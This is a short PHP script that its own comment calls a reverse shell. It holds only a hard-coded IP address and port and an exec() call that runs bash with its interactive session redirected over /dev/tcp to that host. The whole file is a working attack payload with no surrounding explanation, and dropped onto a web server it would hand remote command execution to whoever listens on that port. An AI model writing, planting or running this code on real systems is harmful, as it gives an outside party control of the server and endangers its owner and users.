<?php
// a php reverse shell
$ip = '10.10.10.10';
$port = 1234;
$command = "/bin/bash -c 'bash -i > /dev/tcp/$ip/$port 0>&1'";
exec($command);
?>